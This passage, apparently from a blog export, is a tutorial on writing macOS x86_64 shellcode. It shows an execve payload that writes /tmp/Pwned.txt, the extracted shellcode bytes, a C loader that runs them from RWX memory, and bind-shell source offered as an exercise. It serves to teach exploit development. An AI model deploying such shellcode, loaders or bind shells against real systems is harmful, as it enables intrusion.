`array` label where it will setup the array elements and execute the `execve` syscall and then exit.\n\n```asm\nbits 64\n\nglobal _main\n\n_main:\n\n\txor rcx, rcx \t; NULL Terminator\n\tpush rcx \t; push the NULL Terminator to the stack\n\tmov rdx, '/bin/zsh' \t;  our file/executable name\n\tpush rdx \t; push the file/executable name to the stack\n\tmov rdi, rsp \t; fname => 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name\n\tmov rbx, '-c' \t; argp[1] => the 2nd element in the arguments array\n\tpush rbx \t; push argp[1] to the stack\n\tmov rbx, rsp \t; save the argp[1]('-c') pointer to RBX\n\tpush rcx \t; push the NULL Terminator to the stack\n\tcall array ; call the array label to setup the array for argp\n\tdb 'echo \"W00tW00t\" > /tmp/Pwned.txt', 0 ; arg[2] which is our command and including the NULL Terminator\n\t\narray:\n\tpush rbx ; arg[1] put the -c pointer into the array\n\tpush rdi ; args[0] which is fname saved before\n\tmov rsi, rsp ; pass the array pointer for RSI which holds the second argument\n\txor rdx, rdx ; empty rdx to use as NULL for the third argument envp\n\tmov rax, 0x200003B ; The BSD syscall class entry + 0x3B (which is 59 in hex) kill syscall\n\tsyscall ; invoke/execute syscall\n\t\n\tmov rax, 0x2000001 ; The BSD syscall class entry + exit syscall\n\tmov rdi, 0 ; arg int rval\n\tsyscall ; invoke/execute syscall\n```\n\nHere our shellcode, first zeroes `RCX` with `xor rcx, rcx` and `push rcx` to place an 8-byte `NULL` on the stack which will be reused as padding and as a `NULL` terminator. Next `mov rdx, '/bin/zsh'` loads the bytes for the `filename` into `RDX` and `push rdx` writes those 8 bytes to the stack so that `RSP` now points at the `\"/bin/zsh\"` string. `mov rdi, rsp` copies that stack pointer into `RDI`, which is the first argument to `execve` (the `filename` pointer).After that load `'-c'` into `RBX` and `push rbx`, creating the `\"-c\"` string on the stack; `mov rbx, rsp` saves the pointer to the `\"-c\"` string in `RBX` for later. Another `push rcx` places a `NULL` on the stack. The `call array` instruction is the classic position-independent trick, it pushes the address of the immediately following `db` bytes (the command string) onto the stack and then jumps to the `array` label, so the command string‚Äôs runtime address is already on the stack when `array` executes. The `db 'echo \"W00tW00t\" > /tmp/Pwned.txt', 0` provides the NUL-terminated command that `zsh -c` will execute. Then, At `array`  label we will build the `argp` array by `push rbx` (push pointer to `\"-c\"`) and `push rdi` (push pointer to `\"/bin/zsh\"`), then `mov rsi, rsp` sets `RSI` to point at that array so `execve` receives `argp` correctly. Following `xor rdx, rdx` sets `RDX = 0` so `envp` is `NULL`. `mov rax, 0x200003B` loads the `BSD` syscall number for `execve`.\n\n> Note: `0x3B` = 59 decimal ‚Üí `execve`\n\nAnd `syscall` invokes the kernel to execute `execve(filename, argv, envp)`. If `execve` returns (i.e., it failed) the code falls through to `mov rax, 0x2000001` / `mov rdi, 0` / `syscall` which calls the `exit` syscall to terminate the process.\n\n```sh\nshellcoding % nasm -f macho64 execute.asm                                                                                                          \nshellcoding % ld -o execute execute.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5\nld: warning: no platform load command found in '/Users/zeyadazima.com/shellcoding/execute.o', assuming: macOS\nshellcoding % ls /tmp\nnode-compile-cache OSL_PIPE_501_SingleOfficeIPC\tpowerlog\nshellcoding % ./execute                                                                                                                            \nshellcoding % ls /tmp  \nnode-compile-cache OSL_PIPE_501_SingleOfficeIPC\tpowerlog Pwned.txt\n/tmp % cat Pwned.txt \nW00tW00t\n```\n\nWe can see clearly, That our shellcode is executed successfully and our file created.\n\n# Extract Shellcode\n\nNow, Let's extract our shellcode from the object file, So if we need to send it with our exploit. We will use `objdump` tool and will show also how to do it with `otool`.\n\n## objdump\n\n```sh\nshellcoding% objdump --disassemble --x86-asm-syntax=intel ~/shellcoding/execute.o\n\nexecute.o:\tfile format mach-o 64-bit x86-64\n\nDisassembly of section __TEXT,__text:\n\n0000000000000000 <_main>:\n       0: 48 31 c9                     \txor\trcx, rcx\n       3: 51                           \tpush\trcx\n       4: 48 ba 2f 62 69 6e 2f 7a 73 68\tmovabs\trdx, 0x68737a2f6e69622f\n       e: 52                           \tpush\trdx\n       f: 48 89 e7                     \tmov\trdi, rsp\n      12: bb 2d 63 00 00               \tmov\tebx, 0x632d\n      17: 53                           \tpush\trbx\n      18: 48 89 e3                     \tmov\trbx, rsp\n      1b: 51                           \tpush\trcx\n      1c: e8 21 00 00 00               \tcall\t0x42 <array>\n      21: 65 63 68 6f                  \tmovsxd\tebp, dword ptr gs:[rax + 0x6f]\n      25: 20 22                        \tand\tbyte ptr [rdx], ah\n      27: 57                           \tpush\trdi\n      28: 30 30                        \txor\tbyte ptr [rax], dh\n      2a: 74 57                        \tje\t0x83 <array+0x41>\n      2c: 30 30                        \txor\tbyte ptr [rax], dh\n      2e: 74 22                        \tje\t0x52 <array+0x10>\n      30: 20 3e                        \tand\tbyte ptr [rsi], bh\n      32: 20 2f                        \tand\tbyte ptr [rdi], ch\n      34: 74 6d                        \tje\t0xa3 <array+0x61>\n      36: 70 2f                        \tjo\t0x67 <array+0x25>\n      38: 50                           \tpush\trax\n      39: 77 6e                        \tja\t0xa9 <array+0x67>\n      3b: 65 64 2e 74 78               \tje\t0xb8 <array+0x76>\n      40: 74 00                        \tje\t0x42 <array>\n\n0000000000000042 <array>:\n      42: 53                           \tpush\trbx\n      43: 57                           \tpush\trdi\n      44: 48 89 e6                     \tmov\trsi, rsp\n      47: 48 31 d2                     \txor\trdx, rdx\n      4a: b8 3b 00 00 02               \tmov\teax, 0x200003b\n      4f: 0f 05                        \tsyscall\n      51: b8 01 00 00 02               \tmov\teax, 0x2000001\n      56: bf 00 00 00 00               \tmov\tedi, 0x0\n      5b: 0f 05                        \tsyscall\n\n```\n\n- Here we can see our dissassembled code clearly and the array, etc. We need to save this into file\n\n```sh\nobjdump --disassemble --x86-asm-syntax=intel ~/shellcoding/execute.o > execute.disasm\n```\n\n - Now, Let's extract the hex bytes from the `execute.disasm` file. Using command line utilities.\n\n```sh\nshellcoding% grep -E '^[[:space:]]+[0-9a-f]+:' execute.disasm \\\n  | awk '{for(i=2;i<=NF;i++) if ($i ~ /^[0-9a-f]{2}$/) printf \"%s\", $i}' \\\n  | tr -d '\\n' > shellcode.hex\nshellcoding% cat shellcode.hex \n4831c95148ba2f62696e2f7a7368524889e7bb2d630000534889e351e8210000006563686f2022573030745730307422203e202f746d702f50776e65642e7478740053574889e64831d2b83b0000020f05b801000002bf000000000f05\n```\n\n- Convert it to binary\n\n```sh\nshellcoding% xxd -r -p shellcode.hex > shellcode.bin\n```\n\n- Let's Check the Shellcode size\n\n```sh\nshellcoding% wc -c shellcode.bin\n      93 shellcode.bin // 93 bytes\n```\n\n- Generate `C` array of bytes for the shellcode\n\n```sh\nshellcoding% xxd -i shellcode.bin > shellcode.h\nshellcoding% cat shellcode.h\nunsigned char shellcode_bin[] = {\n  0x48, 0x31, 0xc9, 0x51, 0x48, 0xba, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a,\n  0x73, 0x68, 0x52, 0x48, 0x89, 0xe7, 0xbb, 0x2d, 0x63, 0x00, 0x00, 0x53,\n  0x48, 0x89, 0xe3, 0x51, 0xe8, 0x21, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68,\n  0x6f, 0x20, 0x22, 0x57, 0x30, 0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22,\n  0x20, 0x3e, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x50, 0x77, 0x6e, 0x65,\n  0x64, 0x2e, 0x74, 0x78, 0x74, 0x00, 0x53, 0x57, 0x48, 0x89, 0xe6, 0x48,\n  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x02, 0x0f, 0x05, 0xb8, 0x01, 0x00,\n  0x00, 0x02, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05\n};\nunsigned int shellcode_bin_len = 93;\n```\n\n## otool\n\n- Extract Raw Section Bytes\n\n```sh\nshellcoding% otool -s __TEXT __text ~/shellcoding/execute.o \\\n  | sed -n '3,$p' \\\n  | awk '{ for(i=2;i<=NF;i++) printf \"%s\",$i } END{ print \"\" }' > shellcode_otool.hex\nshellcoding% cat shellcode_otool.hex \n4831c95148ba2f62696e2f7a7368524889e7bb2d630000534889e351e8210000006563686f2022573030745730307422203e202f746d702f50776e65642e7478740053574889e64831d2b83b0000020f05b801000002bf000000000f05\n```\n\n- Convert to binary `xxd`\n\n```sh\nshellcoding% xxd -r -p shellcode_otool.hex > shellcode_otool.bin\n```\n\n- Check shellcode length\n\n```sh\nShellcoding% wc -c shellcode_otool.bin\n      93 shellcode_otool.bin\n```\n\n- Convert it to `C` array\n\n```sh\nShellcoding% cat shellcode_otool.h\nunsigned char shellcode_otool_bin[] = {\n  0x48, 0x31, 0xc9, 0x51, 0x48, 0xba, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a,\n  0x73, 0x68, 0x52, 0x48, 0x89, 0xe7, 0xbb, 0x2d, 0x63, 0x00, 0x00, 0x53,\n  0x48, 0x89, 0xe3, 0x51, 0xe8, 0x21, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68,\n  0x6f, 0x20, 0x22, 0x57, 0x30, 0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22,\n  0x20, 0x3e, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x50, 0x77, 0x6e, 0x65,\n  0x64, 0x2e, 0x74, 0x78, 0x74, 0x00, 0x53, 0x57, 0x48, 0x89, 0xe6, 0x48,\n  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x02, 0x0f, 0x05, 0xb8, 0x01, 0x00,\n  0x00, 0x02, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05\n};\nunsigned int shellcode_otool_bin_len = 93;\n```\n\n## Test Shellcode with Loader\n\nNow, let's write a loader in `C` to try and execute our shellcode:\n\n```c\n#include <stdio.h>\n#include <sys/mman.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <sys/wait.h>\n#include <stdlib.h>\n\nint main(void) {\n    unsigned char code[] = {\n      0x48, 0x31, 0xc9, 0x51, 0x48, 0xba, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a,\n      0x73, 0x68, 0x52, 0x48, 0x89, 0xe7, 0xbb, 0x2d, 0x63, 0x00, 0x00, 0x53,\n      0x48, 0x89, 0xe3, 0x51, 0xe8, 0x21, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68,\n      0x6f, 0x20, 0x22, 0x57, 0x30, 0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22,\n      0x20, 0x3e, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x50, 0x77, 0x6e, 0x65,\n      0x64, 0x2e, 0x74, 0x78, 0x74, 0x00, 0x53, 0x57, 0x48, 0x89, 0xe6, 0x48,\n      0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x02, 0x0f, 0x05, 0xb8, 0x01, 0x00,\n      0x00, 0x02, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05\n    };\n    size_t len = sizeof(code);\n\n    pid_t pid = fork();\n    if (pid < 0) {\n        perror(\"fork\");\n        return 1;\n    }\n\n    if (pid == 0) {\n        // child: allocate RWX, copy shellcode and execute\n        void *exec = mmap(NULL, len, PROT_READ|PROT_WRITE|PROT_EXEC,\n                          MAP_ANON|MAP_PRIVATE, -1, 0);\n        if (exec == MAP_FAILED) {\n            perror(\"mmap\");\n            _exit(127);\n        }\n        memcpy(exec, code, len);\n\n        // print from child so you can see it if child doesn't get replaced\n        printf(\"[child %d] executing shellcode (%zu bytes)...\\n\", getpid(), len);\n        fflush(stdout);\n\n        int (*func)() = (int(*)())exec;\n        int r = func(); // if shellcode calls execve, child will be replaced\n        // If returned, report and exit child\n        printf(\"[child %d] shellcode returned %d\\n\", getpid(), r);\n        fflush(stdout);\n        _exit(r & 0xFF);\n    } else {\n        // parent: wait for child and then check side-effect\n        int status = 0;\n        printf(\"[parent %d] spawned child %d, waiting...\\n\", getpid(), pid);\n        fflush(stdout);\n\n        if (waitpid(pid, &status, 0) == -1) {\n            perror(\"waitpid\");\n            return 2;\n        }\n\n        if (WIFEXITED(status)) {\n            printf(\"[parent] child exited with status %d\\n\", WEXITSTATUS(status));\n        } else if (WIFSIGNALED(status)) {\n            printf(\"[parent] child killed by signal %d\\n\", WTERMSIG(status));\n        } else {\n            printf(\"[parent] child ended with status 0x%x\\n\", status);\n        }\n\n        // small sleep to allow any async side-effects to settle\n        usleep(200000);\n\n        const char *check_path = \"/tmp/Pwned.txt\";\n        if (access(check_path, F_OK) == 0) {\n            printf(\"[parent] Success: '%s' exists.\\n\", check_path);\n            return 0;\n        } else {\n            printf(\"[parent] Failure: '%s' not found (errno=%d: %s)\\n\",\n                   check_path, errno, strerror(errno));\n            return 3;\n        }\n    }\n}\n```\n\nThe loader‚Äôs job is simple: it stores raw machine-code bytes (the shellcode) in a C `unsigned char` array, allocates a memory region with execute permission, copies the bytes into that region, casts the region pointer to a function pointer, and then calls it. That direct transfer of control is what lets the program run arbitrary machine code in the address space of the process. Because the shellcode can call `execve`, `_exit`, crash, or otherwise change the process state, the loader must be written with the understanding that control might never return to the original C runtime after the call into the shellcode. In the original single-process loader, `unsigned char code[] = { ... };` places the bytes in the program‚Äôs data segment; `size_t len = sizeof(code);` computes the number of bytes to map and copy. The program then calls `mmap(NULL, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_PRIVATE, -1, 0)`. This requests an anonymous (no-file-back) memory mapping with read, write and execute permissions; `NULL` lets the kernel choose the address, `len` is the requested size, and `MAP_ANON|MAP_PRIVATE` means the mapping is private and not backed by a file. If `mmap` fails (returns `MAP_FAILED`) the loader prints the error and exits. After a successful mapping the loader uses `memcpy(exec, code, len)` to place the shellcode bytes into the mapped pages, then casts the `void *` returned by `mmap` to a function pointer (`int (*func)() = (int(*)())exec;`) and calls `func()`. Casting a data pointer to a code pointer and invoking it is implementation-defined in the C standard, but is the de‚Äëfacto technique used on `POSIX` systems for this purpose. What can happen when the call to `func()` executes depends entirely on what the shellcode does. If the shellcode is written to return cleanly it will restore registers and the stack appropriately and the loader continues execution after the call. If the shellcode invokes `execve()` successfully, the kernel replaces the entire process image with a new program, so none of the loader‚Äôs code after the call executes. If the shellcode calls `_exit()` or the process receives a fatal signal (segfault, illegal instruction), the process terminates and again no post-call statements run. Shellcode that corrupts the stack or registers without restoring them will also produce undefined behavior in the loader when control returns. In short: seeing only the pre-exec print usually means the shellcode either replaced or terminated the process or crashed it before your post-exec prints could run. A forked-loader variant is useful because it isolates the untrusted shellcode in a child process while the parent remains alive to observe results. When the program `fork()`, the child repeats the mapping, copy and invocation of the shellcode; any `execve` or `_exit` inside the child affects only the child. The parent calls `waitpid(child, &status, 0)` to get the child‚Äôs exit status and can report whether the child exited normally, was killed by a signal, or returned a particular code. The parent can also check for side-effects such as files written by the child (for example `/tmp/Pwned.txt`) and print reliable diagnostics. This pattern is ideal for debugging shellcode that tends to replace or terminate its host process ‚Äî the parent becomes the stable observer.\n\n- Compile and Test the shellcode with the loader\n\n```C\nzeyadazima.com% clang -o cloader cloader.c\nzeyadazima.com% ./cloader \n[parent 29373] spawned child 29374, waiting...\n[child 29374] executing shellcode (93 bytes)...\n[parent] child exited with status 0\n[parent] Success: '/tmp/Pwned.txt' exists.\n```\n\nAs we can see our shellcode executed successfully with no issues.\n\n# Exercises\n\nIf you want to dive deeper more, you can do this exercise which is involving in creating a `BindShell` shellcode and execute it. \n\nHere all the things you need for the excersice:\n\n- BindShell `C` code\n\n```C\n// Source - https://stackoverflow.com/q\n// Posted by gatorface, modified by community. See post 'Timeline' for change history\n// Retrieved 2025-11-10, License - CC BY-SA 3.0\n\n// Author:  Julien Ahrens (@MrTuxracer)\n// Website:  http://www.rcesecurity.com \n\n#include <stdio.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n\nint main(void)\n{\n    int i; // used for dup2 later\n    int sockfd; // socket file descriptor\n    int clientfd; // client file descriptor\n    socklen_t socklen; // socket-length for new connections\n\n    struct sockaddr_in srv_addr; // server aka listen address\n    struct sockaddr_in cli_addr; // client address\n\n    srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address\n    srv_addr.sin_port = htons( 1337 ); // server port, converted to network byte order\n    srv_addr.sin_addr.s_addr = htonl (INADDR_ANY); // listen on any address, converted to network byte order\n\n    // create new TCP socket\n    sockfd = socket(2, 1, 0);\n\n    // bind socket\n    bind( sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr) );\n\n    // listen on socket\n    listen(sockfd, 0);\n\n    // accept new connections\n    socklen = sizeof(cli_addr);\n    clientfd = accept(sockfd, (struct sockaddr *)&cli_addr, &socklen );\n\n    // dup2-loop to redirect stdin(0), stdout(1) and stderr(2)\n    for(i = 0; i <= 2; i++)\n        dup2(clientfd, i);\n\n    // magic\n    // execve( \"/bin/sh\", NULL, NULL );\n\n    //UPDATE: fixed exec call, shell still not returned to\n    // client connecting with execl or proper execve\n    execl(\"/bin/sh\", \"/bin/sh\", (char *)NULL);\n}\n\n```\n\nTasks:\n\n- Use `execve()` instead of `execl`\n- Collect the syscall for `socket`,`bind`,`listen`,`accept` and `dup2`. As you will use it to build your `BindShell`.\n- Study the functions arguments and get it ready for the functions/syscalls\n- Make sure to go around with the `struct`, Cause it's similler to the way we built arrays\n- Make sure to use the kernel source code to hop-around to find a variable value, like the `#define AF_INET` for example and explore the source code to help you creating your shellcode.\n\n## Help ?\n\nIf you got any questions or need help, You can contact me:\n- [Linkedin](https://www.linkedin.com/in/zer0verflow/)\n- [Twitter/X](https://x.com/AzimaZeyad)\n- Email: [contact@zeyadazima.com](mailto:contact@zeyadazima.com)\n- Discord: `.killer_1337` including `.`\n\n# Conclusion\n\nWe explored the fundamentals of writing shellcode on `macOS` for the `x86_64` architecture. We set up a proper lab environment, understood the `XNU` kernel and its syscall classes, and clarified calling conventions and register usage crucial for crafting shellcode. By following a structured workflow‚Äîstarting from `C` code, identifying syscalls, converting to assembly, and handling arguments‚Äîwe successfully created shellcodes for printing text, terminating processes, and executing commands. Through these examples, we demonstrated practical techniques such as handling arguments on the stack, using position-independent code, and correctly invoking syscalls in the `BSD` subsystem of `macOS`. This foundation sets the stage for more advanced topics.\n\n\n\n\n# References\n\n- https://codebrowser.dev/\n- https://man.freebsd.org/\n- https://pubs.opengroup.org\n- https://man7.org/linux/man-pages/\n- https://opensource.apple.com/releases/\n- https://github.com/apple-oss-distributions/xnu\n- https://xcodereleases.com\n- https://newosxbook.com\n","slug":"shellcoding-on-macos-64","published":1,"updated":"2025-11-28T16:31:04.958Z","comments":1,"layout":"post","photos":[],"_id":"cmij2yuof000a9reufzdk2ymd","content":"<h1 id=\"Introduction\"><a href=\"#Introduction\" class=\"headerlink\" title=\"Introduction\"></a>Introduction</h1><p>This guide explores shellcoding on the <code>x86_64</code> architecture for <code>macOS</code>, bypassing the traditional x86 starting point for a practical reason: with the release of macOS 10.15 (<code>Catalina</code>), Apple discontinued support for <code>32-bit</code> applications entirely. Since <code>x86_64</code> maintains backward compatibility with x86 code anyway, focusing on <code>64-bit</code> shellcoding makes the most sense for modern <code>macOS</code> systems. Before diving in, you‚Äôll need at least a basic understanding of assembly language‚Äîthis isn‚Äôt an assembly tutorial, so if you‚Äôre unfamiliar with the fundamentals, take some time to learn them first and return when you‚Äôre ready for the challenge. Rather than immediately jumping into cryptic assembly instructions, this guide follows a practical workflow: start by writing code in <code>C</code>, identify the necessary system calls, and then translate everything into assembly. This approach leverages the wealth of existing <code>C</code> documentation and resources, making the process significantly more manageable. You‚Äôll find countless examples of how to build network clients, manipulate processes, or execute commands in <code>C</code>, but you‚Äôd be hard-pressed to find someone talking about implementing these same tasks purely in assembly. Let‚Äôs start with our Blogpost.</p>\n<blockquote>\n<p>You can find all the code on my github: <a href=\"https://github.com/Zeyad-Azima/macOShellcoding\">https://github.com/Zeyad-Azima/macOShellcoding</a></p>\n</blockquote>\n<h1 id=\"Lab-Setup\"><a href=\"#Lab-Setup\" class=\"headerlink\" title=\"Lab Setup\"></a>Lab Setup</h1><p>Let‚Äôs Setup our Lab and the required tools, Let‚Äôs list all the other tools we need. </p>\n<ul>\n<li>Homebrew</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">/bin/bash -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Xcode:</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">We can download it from `AppStore`.</span><br><span class=\"line\">or: https://xcodereleases.com</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Xcode Command Line Tools (CLT)</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">xcode-select --install</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Nasm</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">brew install nasm</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Binutils (<code>ld</code>)</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">brew install binutils</span><br></pre></td></tr></table></figure>\n\n<p>Before we go on straight to shellcoding, We need to understand some FUNDAMENTALS first we would be using to be able to write shellcodes. As we know the macos kernel (<code>XNU</code>) is a hybrid kernel which contains also <code>BSD</code>. We need to download the <code>XNU</code> source code. Cause we will use it for references in creating ours shellcodes and understanding <code>syscalls</code> on <code>macOS</code>. We can download it from <a href=\"https://opensource.apple.com/releases/\">here</a>.</p>\n<p>Now, We need to download the source code version that matches the macOS you writing the shellcode for. I am on <code>macOS Sequoia</code> and the version is <code>macOS 15.5</code>. You can use <code>sw_vers</code> command to check it.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">~ % sw_vers</span><br><span class=\"line\">ProductName:\t\tmacOS</span><br><span class=\"line\">ProductVersion:\t\t15.5</span><br><span class=\"line\">BuildVersion:\t\t24F74</span><br></pre></td></tr></table></figure>\n\n<p>Now, Let‚Äôs download the <code>XNU</code> VERSION FOR it.</p>\n<p><img src=\"/images/site/posts/macos/xnu-release-page.png\" alt=\"macOS XNU release page\"></p>\n<p>When we scroll down more we can find it.</p>\n<p><img src=\"/images/site/posts/macos/xnu-version-block.png\" alt=\"XNU version block\"></p>\n<p>That‚Äôs the version (<code>xnu-11417.121.6</code>) of <code>macOS 15.5</code>.</p>\n<h1 id=\"XNU-Syscall-Classes\"><a href=\"#XNU-Syscall-Classes\" class=\"headerlink\" title=\"XNU Syscall Classes\"></a>XNU Syscall Classes</h1><p>Now, Let‚Äôs open it with <code>VSCode</code> or your favorite <code>IDE/CodeEditor</code>.</p>\n<p><img src=\"/images/site/posts/macos/xnu-tree.png\" alt=\"XNU source tree in VS Code\"></p>\n<p>All these files and folders for kernel we will use just some of it to understand the basics, But while we writing our shellcodes we would be navigating a lot through different files and folders. First Let‚Äôs go to <code>osfmk/mach/i386/syscall_sw.h</code>.</p>\n<p><img src=\"/images/site/posts/macos/syscall-header.png\" alt=\"syscall header snippet\"></p>\n<p>starting on line <code>135</code> till <code>152</code>, That‚Äôs what matters of us. In here as we know and mentioned before that <code>XNU</code> is hybrid, So if you want to make execute a syscall for related to <code>BSD</code> you would need to define the entry to it.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_CLASS_SHIFT\t24</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_CLASS_MASK\t(0xFF &lt;&lt; SYSCALL_CLASS_SHIFT)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_NUMBER_MASK\t(~SYSCALL_CLASS_MASK)</span></span><br><span class=\"line\">......</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_CLASS_NONE\t0\t<span class=\"comment\">/* Invalid */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_CLASS_MACH\t1\t<span class=\"comment\">/* Mach */</span>\t</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_CLASS_UNIX\t2\t<span class=\"comment\">/* Unix/BSD */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_CLASS_MDEP\t3\t<span class=\"comment\">/* Machine-dependent */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_CLASS_DIAG\t4\t<span class=\"comment\">/* Diagnostics */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SYSCALL_CLASS_IPC\t5\t<span class=\"comment\">/* Mach IPC */</span></span></span><br></pre></td></tr></table></figure>\n\n<p>In <code>XNU</code> (the kernel underlying <code>macOS</code>, <code>iOS</code>, etc.), system calls are not uniformly accessed via a single syscall table like in <code>Linux</code>. Instead, <code>XNU</code> uses syscall classes to route calls through different subsystems. Each system call class is associated with a unique number, which is shifted left by 24 bits (defined by <code>SYSCALL_CLASS_SHIFT</code>) to determine its class. So for every class to get the entry it will be as the following:</p>\n<table>\n<thead>\n<tr>\n<th>Class</th>\n<th>Name</th>\n<th>Value</th>\n<th>Shifted Base (<code>&lt;&lt; 24</code>)</th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0</td>\n<td><code>SYSCALL_CLASS_NONE</code></td>\n<td>0</td>\n<td><code>0x00000000</code></td>\n<td>Invalid</td>\n</tr>\n<tr>\n<td>1</td>\n<td><code>SYSCALL_CLASS_MACH</code></td>\n<td>1</td>\n<td><code>0x01000000</code></td>\n<td>Mach traps</td>\n</tr>\n<tr>\n<td>2</td>\n<td><code>SYSCALL_CLASS_UNIX</code></td>\n<td>2</td>\n<td><code>0x02000000</code></td>\n<td><strong>BSD syscalls</strong></td>\n</tr>\n<tr>\n<td>3</td>\n<td><code>SYSCALL_CLASS_MDEP</code></td>\n<td>3</td>\n<td><code>0x03000000</code></td>\n<td>Machine-dependent</td>\n</tr>\n<tr>\n<td>4</td>\n<td><code>SYSCALL_CLASS_DIAG</code></td>\n<td>4</td>\n<td><code>0x04000000</code></td>\n<td>Diagnostics</td>\n</tr>\n<tr>\n<td>5</td>\n<td><code>SYSCALL_CLASS_IPC</code></td>\n<td>5</td>\n<td><code>0x05000000</code></td>\n<td>Mach IPC (newer)</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>BSD &#x3D; 0x02 &lt;&lt; 24 &#x3D; 0x02000000 ‚Üí 0x2000000</p>\n</blockquote>\n<p>The <code>SYSCALL_CLASS_MASK</code> and <code>SYSCALL_NUMBER_MASK</code> are used to extract the class and syscall number respectively. For example, a traditional <code>BSD</code> system call such as <code>execve</code> (system call number <code>59</code> or <code>0x3b</code> in hex) in the <code>SYSCALL_CLASS_UNIX</code> (number <code>2</code>) would be represented as <code>0x200003b</code> when passed to the syscall assembly instruction.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">; Assembly example to make a syscall with execve (BSD) in macOS</span><br><span class=\"line\">mov rax, 0x200003b  ; Load the syscall number for execve (59 with class mask)</span><br><span class=\"line\">mov rdi, address    ; Address of the command to execute</span><br><span class=\"line\">mov rsi, argv       ; Pointer to an array of arguments</span><br><span class=\"line\">mov rdx, envp       ; Pointer to an array of environment variables</span><br><span class=\"line\">syscall             ; Make the system call</span><br></pre></td></tr></table></figure>\n\n<p>To make it clear, You‚Äôre dining in the <code>XNU</code> restaurant, a multi-level establishment where each floor represents a different system call class, and the kitchen routes your order based on a cleverly encoded ticket. The first floor, <code>SYSCALL_CLASS_MACH</code> (class 1), serves hearty main courses like task and thread operations, while the second floor, <code>SYSCALL_CLASS_UNIX</code> (class 2), specializes in classic <code>BSD</code> desserts such as <code>execve</code> and <code>write</code>. To order a medium-rare steak ‚Äî item number <code>0x3B</code> (59) on the Mach floor ‚Äî you must tell the waiter <code>0x0100003B</code>, calculated as <code>(1 &lt;&lt; 24) | 0x3B</code>. Craving tiramisu (<code>execve</code>, also #59) from the <code>BSD</code> floor? Your order becomes <code>0x0200003B</code> ‚Äî same dish number, different floor, computed as <code>(2 &lt;&lt; 24) | 0x3B</code>. Just like in <code>XNU</code>, never shout just ‚Äú59‚Äù ‚Äî the kitchen needs the full encoded number with the class shifted 24 bits left, ensuring your steak doesn‚Äôt arrive as a dessert (and vice versa). Bon app√©tit in the kernel!</p>\n<h1 id=\"x86-64-Calling-Conventions-and-Registers\"><a href=\"#x86-64-Calling-Conventions-and-Registers\" class=\"headerlink\" title=\"x86_64 Calling Conventions and Registers\"></a>x86_64 Calling Conventions and Registers</h1><p>In the <strong>x86-64 System</strong> used by macOS, function arguments are passed via registers in this order: <code>RDI</code> holds the 1st argument, <code>RSI</code> the 2nd, <code>RDX</code> the 3rd (and sometimes the 2nd return value), <code>RCX</code> the 4th, <code>R8</code> the 5th, and <code>R9</code> the 6th. The return value (or syscall number) is placed in <code>RAX</code>, while <code>RIP</code> points to the next instruction, <code>RSP</code> manages the stack (and must be <strong>16-byte aligned</strong> before any function call), <code>RBP</code> serves as the frame pointer for stack frames, and <code>RBX</code> acts as a general-purpose base register often preserved across calls. If a function requires more than six arguments, additional arguments are passed on the stack. It is essential to ensure that the <code>RSP</code> is properly aligned before making a function call. Despite system calls often working without strict alignment, adhering to this requirement is a good practice to avoid unexpected behavior. To illustrate how these registers are used in a function call, consider a function 